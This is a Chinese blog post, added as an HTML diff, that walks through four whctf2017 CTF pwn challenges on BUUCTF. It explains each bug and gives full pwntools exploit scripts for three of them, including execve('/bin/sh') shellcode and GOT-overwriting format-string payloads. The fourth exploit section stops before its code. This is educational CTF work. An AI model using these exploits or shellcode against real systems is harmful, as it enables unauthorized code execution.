@@ -1,0 +1,265 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>whctf2017 pwn题wp | ZIKH26's Blog</title><meta name="keywords" content="IO_FILE attack"><meta name="author" content="ZIKH26"><meta name="copyright" content="ZIKH26"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="今天做题的时候无意做了一道buu上的whctf2017 stackoverflow,做完之后发现另外几道whctf2017的题目也很不错，就打算全做了都学习一下，题目全部在buu上都可以找到 总结 简单总结一下这四道题，它们分别考察了如下的知识点： 第一题考察了scanf函数最终的输入是在内部的count &#x3D; _IO_SYSREAD(fp, fp-&gt;_IO_buf_base, fp-&gt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="whctf2017 pwn题wp">
+<meta property="og:url" content="https://zikh26.github.io/posts/1694f8f0.html">
+<meta property="og:site_name" content="ZIKH26&#39;s Blog">
+<meta property="og:description" content="今天做题的时候无意做了一道buu上的whctf2017 stackoverflow,做完之后发现另外几道whctf2017的题目也很不错，就打算全做了都学习一下，题目全部在buu上都可以找到 总结 简单总结一下这四道题，它们分别考察了如下的知识点： 第一题考察了scanf函数最终的输入是在内部的count &#x3D; _IO_SYSREAD(fp, fp-&gt;_IO_buf_base, fp-&gt;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zikh26.github.io/img/22.jpg">
+<meta property="article:published_time" content="2023-05-14T15:14:50.164Z">
+<meta property="article:modified_time" content="2023-05-14T15:14:50.164Z">
+<meta property="article:author" content="ZIKH26">
+<meta property="article:tag" content="IO_FILE attack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zikh26.github.io/img/22.jpg"><link rel="shortcut icon" href="/img/me.jpg"><link rel="canonical" href="https://zikh26.github.io/posts/1694f8f0"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'whctf2017 pwn题wp',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-05-14 23:14:50'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/me.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">94</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">97</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/22.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ZIKH26's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">whctf2017 pwn题wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-14T15:14:50.164Z" title="发表于 2023-05-14 23:14:50">2023-05-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-14T15:14:50.164Z" title="更新于 2023-05-14 23:14:50">2023-05-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/buu%E5%88%B7%E9%A2%98/">buu刷题</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/posts/1694f8f0.html" data-flag-title="whctf2017 pwn题wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>今天做题的时候无意做了一道buu上的whctf2017 stackoverflow,做完之后发现另外几道whctf2017的题目也很不错，就打算全做了都学习一下，题目全部在buu上都可以找到</p>
+<h2 id="总结">总结</h2>
+<p>简单总结一下这四道题，它们分别考察了如下的知识点：</p>
+<p>第一题考察了scanf函数最终的输入是在内部的<code>count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code>这行代码，只要能控制这几个字段并且对其他一些字段进行绕过，就可以实现IO的任意地址写</p>
+<p>第二题考察了条件竞争漏洞，在多线程的操作中访问同一个全局变量没有加锁，在delete函数中让全局指针被减到了位于got表的位置，从而malloc申请堆块的地址写入了got表里，没有开NX导致堆可执行，从而劫持got表跳转到堆的shellcode上</p>
+<p>第三题考察的是snprintf执行中的格式化字符串漏洞，snprintf是一个字符一个字符来处理的，可能是采取了一种循环遍历的方式，所以即使最初调用snprintf的时候format是%s，但后续的操作中format被改变了，然后再取格式化字符的时候触发了漏洞。<strong>snprintf拷贝字符的时候可能存在溢出</strong></p>
+<p>第四题考察的是未初始化漏洞，在打印之前，没有对操作的指针进行初始化，从而使用了栈里的残留数据，泄露出了canary，配合gets的栈溢出漏洞，ret2libc获取shell</p>
+<h2 id="whctf2017-stackoverflow">whctf2017_stackoverflow</h2>
+<h3 id="保护策略">保护策略</h3>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212130846592.png" alt="image-20221213084612401" style="zoom:50%;" />
+<h3 id="漏洞所在">漏洞所在</h3>
+<p>第一个漏洞点是往栈里输入数据之后没有0截断，并且使用了%s打印数据，从而可以泄露栈里存储的libc地址(如下)</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212130846562.png" alt="image-20221213084641509" style="zoom:50%;" />
+<p>第二个漏洞是v2和size可以不一样，如果size大于0x300000的话，可以重新输入size(但是v2没有被更新)，而malloc函数申请大于128KB(0x20000 bit)的内存时会调用mmap在内存共享区映射出来一块内存，这片内存和libc里的地址存在固定偏移，我们提前控制一个v2的话就可以向任意一个libc地址写入一个0(如下)</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212130903387.png" alt="image-20221213090336309" style="zoom:50%;" />
+<h3 id="利用思路">利用思路</h3>
+<p>scanf的调用流程为scanf-&gt;vfscanf-&gt;__uflow-&gt;_IO_default_uflow()-&gt;underflow-&gt;_IO_file_underflow()</p>
+<p>在最后的这个函数中有段代码调用了read  如下</p>
+<p><code>count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code></p>
+<p>如果我们可以控制IO_buf_base，并且保证_IO_buf_end - _IO_buf_base不为0，就能实现地址任意写的目的。</p>
+<p>不过需要绕过下面的检查，也就是要IO_read_ptr等于IO_read_end</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) </span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *)fp-&gt;_IO_read_ptr;</span><br></pre></td></tr></table></figure>
+<p>我们的思路是向_IO_buf_base的地址里写入一个0，从而去再次控制_IO_buf_base字段。如下</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131100968.png" alt="image-20221213110056374" style="zoom:50%;" />
+<p>此时的buf_base中的地址末尾已经被篡改为了00，所以下次可以向0x7f8d614a3900这个地址里写入(buf_end-buf_base)个字节的数据，该地址是_IO_write_base字段，下次输入的话，我们控制buf_base为malloc_hook的地址，而buf_end至少要为malloc_hook-8（因为buf_end-buf_base就是下次往malloc_hook里写入的字节数）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131101394.png" alt="image-20221213110142157"></p>
+<p>篡改后的buf_base和buf_end如下，此时还无法往malloc_hook里写入数据，因为_IO_read_ptr和_IO_read_end并不相同。而当前函数被不断循环，其中IO_getc(stdin)函数可以刷新_IO_read_ptr，让其从输入缓冲区中读入一个字节的数据，并且让read_ptr指针加1，因此我们随便输入数据，触发getc函数39次就可以让read_ptr和read_end相同，从而往malloc_hook里写入one_gadget，在之后调用malloc函数的时候即可获取shell</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131104947.png" alt="image-20221213110433209"></p>
+<h3 id="EXP">EXP</h3>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25978&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;leave your name, bro:&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">40</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x7b947</span><span class="comment">#-0x7b957#</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x5c5908</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x200000</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;padding and ropchain: &quot;</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">debug(p,<span class="number">0x400A45</span>,<span class="number">0x4008FF</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="string">b&#x27;s&#x27;</span>*<span class="number">0x18</span>+p64(malloc_hook)+p64(malloc_hook+<span class="number">0x8</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;padding and ropchain: &quot;</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,p64(search_og(<span class="number">3</span>)+libc_base))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131111298.png" alt="image-20221213111146066"></p>
+<h2 id="whctf2017-note-sys">whctf2017_note_sys</h2>
+<h3 id="保护策略-v2">保护策略</h3>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131657725.png" alt="image-20221213165703414" style="zoom:50%;" />
+<h3 id="漏洞所在-v2">漏洞所在</h3>
+<p>本题是有一个add函数和delete函数，不过都是去创建了一个子进程来调用函数。</p>
+<p>在两个函数中都涉及到了对同一个全局变量进行操作，在add函数中malloc申请堆块后将地址存入了202080指向的位置(这个位置是2020C0)，每次执行add函数的时候都会将202080指向的地址+8，也就是执行完当前函数再执行add函数，就是将malloc返回的地址写入2020c8里</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131659243.png" alt="image-20221213165948173" style="zoom:50%;" />
+<p>而执行delete函数则是每次执行完都让202080指向的地址-8(如下)，但需要注意的是先在202080指向的地址-8之后有一个usleep（这里会休眠两秒钟），而后再去执行下面的free函数部分</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131707847.png" alt="image-20221213170753777" style="zoom:50%;" />
+<h3 id="利用思路-v2">利用思路</h3>
+<p>核心点是delete函数在子进程中被执行，并且父进程里没有pthread_join函数，这意味着我们可以趁着子进程执行delete函数的空隙，让父进程再次调用delete函数，让202080指向的地址2020c0不断去-8，减到got表的位置。再执行add函数，malloc申请一个堆块，向堆块里写入shellcode，此时malloc返回的地址被写入到了free的got表里，最终调用free函数的时候触发shellcode</p>
+<p>正常情况下去free掉got地址会报错，但此处的条件竞争是在执行free函数前不断开启多个子进程对一个全局变量进行操作，<strong>还没有执行到free函数崩溃前就已经把shellcode写到了free的got表里获取了shell</strong></p>
+<p>循环22次也很好算 (0x2020c0-0x202018-8)/8=22   （这里不能直接写free的got地址，应该再减8字节，因为最后add的时候是先加了八字节）</p>
+<h3 id="EXP-v2">EXP</h3>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:28673&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rdi ,0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&quot;\x48\x31\xC0\x6A\x3B\x58\x48\x31\xFF\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x48\x31\xF6\x56\x57\x54\x5F\x48\x31\xD2\x0F\x05&quot;</span></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xB66</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;input your note, no more than 250 characters\n&quot;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131726043.png" alt="image-20221213172644320"></p>
+<h2 id="whctf2017-easypwn">whctf2017_easypwn</h2>
+<h3 id="保护策略-v3">保护策略</h3>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301822473.png" alt="image-20221230182239349" style="zoom:50%;" />
+<h3 id="漏洞所在-v3">漏洞所在</h3>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301823966.png" alt="image-20221230182343891" style="zoom:50%;" />
+<p>v3可被覆盖控制，而v3是format参数，可控就代表着存在格式化字符串漏洞。</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301831494.png" alt="image-20221230183118429" style="zoom:50%;" />
+<p>snprintf会将s的数据拷贝0x7d0到v2上面，但是s和v2仅相离0x400，也就是说如果s写入0x400的话，拷贝到v2里面的时候就会溢出0x18个字节(v2和v3仅相距0x3e8个字节)从而控制v3，触发格式化字符串漏洞。</p>
+<h3 id="利用思路-v3">利用思路</h3>
+<p>relro保护开的是partial relro，这意味着可以篡改GOT表，而程序的此处莫名其妙的出现了一个free函数(如下)，并且free掉堆块的内容可控，很明显是想让我们劫持free的got表为system，然后堆块里面写入/bin/sh最后执行free获取shell</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301905510.png" alt="image-20221230190529433"></p>
+<p>利用的时候有几个点需要注意一下：</p>
+<p>1 就是格式化字符串利用的时候，发现0x3e8后不能直接触发漏洞，需要填充两个字符串才能利用(这里是试出来的，原因未知)</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301909592.png" alt="image-20221230190941547"></p>
+<p>2 本题属于snprintf执行中的格式化字符串漏洞，snprintf是一个字符一个字符来处理的，可能是采取了一种循环遍历的方式，所以即使最初调用snprintf的时候format是%s，但后续的操作中format被改变了，然后再取格式化字符的时候触发了漏洞。</p>
+<p>3 snprintf函数的format是在第三个参数的位置，所以算栈顶偏移的时候不是和以前加6，而是加4。</p>
+<p>4 我这里是跑了三次循环，每次改写free函数的got表两个字节，三次下来就写了system的6字节地址。</p>
+<p>5 这里写入数据的话，肯定是要减去前面发送的垃圾数据0x3e8个a,但是后面的0x16不知道咋来的，但这里也是可以试出来的，先减去0x3e8后，发现自己要写的值和实际写入的值差了0x16，那就在exp里多减0x16就能得到正确的值。</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301916047.png" alt="image-20221230191633995"></p>
+<p>PS：exp不是一定能打通，因为如果libc地址的低位比较小的话，会导致payload后面没有对齐，不过这个概率不大，没打通的话多跑两次就行</p>
+<h3 id="EXP-v3">EXP</h3>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:27618&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input Your Code:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xC05</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x3e8</span>+<span class="string">&quot;b&quot;</span>*<span class="number">2</span>+<span class="string">&quot;%396$p%397$p&quot;</span><span class="comment"># libc addr 393+4</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome To WHCTF2017:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;397$p\n&quot;</span>)</span><br><span class="line">base_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0xda0</span></span><br><span class="line">log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x20830</span><span class="comment">#0x20840</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">value=(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">x=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    log_info(<span class="built_in">hex</span>(value%<span class="number">0x10000</span>))</span><br><span class="line">    payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x3e8</span>+<span class="string">b&quot;bb%&quot;</span>+<span class="built_in">str</span>(value%<span class="number">0x10000</span>-<span class="number">0x3e8</span>-<span class="number">0x16</span>).encode()+<span class="string">b&quot;c%133$hn&quot;</span>+p64(base_addr+e.got[<span class="string">&#x27;free&#x27;</span>]+i*<span class="number">2</span>)</span><br><span class="line">    value=value&gt;&gt;<span class="number">16</span></span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input Your Code:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Welcome To WHCTF2017:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xD40</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input Your Code:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input Your Name:\n&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301808658.png" alt="image-20221230180818030" style="zoom:50%;" />
+<h2 id="whctf2017-rc4">whctf2017_rc4</h2>
+<h3 id="保护策略-v4">保护策略</h3>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302213510.png" alt="image-20221230221340383" style="zoom:50%;" />
+<h3 id="漏洞所在-v4">漏洞所在</h3>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302214459.png" alt="image-20221230221432405" style="zoom: 50%;" />
+<p>这里存在了一个无法触发的格式化字符串漏洞，因为v1取的是一个字节的数据，但是rand生成的随机数是四字节的，无论如何也无法通过这个If检查触发格式化字符串漏洞</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302216225.png" alt="image-20221230221652145" style="zoom:50%;" />
+<p>这里存在一个未初始化漏洞，如果进入这个函数不选择a b或者c的话，那么会跳转到LABEL_12的地方，而v2这个位置则是一个canary(这里我是先看roderick师傅写的wp，说可以利用这里泄露出来canary，然后调试了一下发现确实如此，如果单纯看代码的话确实无法发现这里是一个canary)</p>
+<p>这个canary又被放到了*0x6020D8的位置，而后有个打印函数将0x6020D0开始16个字节进行了泄露，由此得到了canary</p>
+<p>下图展示的代码部分还存在一个明显的栈溢出漏洞</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302222846.png" alt="image-20221230222229763" style="zoom:50%;" />
+<h3 id="利用思路-v4">利用思路</h3>
+<p>先泄露canary，然后利用栈溢出打ret2libc，我这里选择返回的是bss段上，进行了一个栈迁移，最后迁移过去的执行流是调用了execve(“/bin/sh\x00”,0,0) 当时用system发现没打通，索性就换成execve系统调用了</p>
+<h3 id="EXP-v4">EXP</h3>
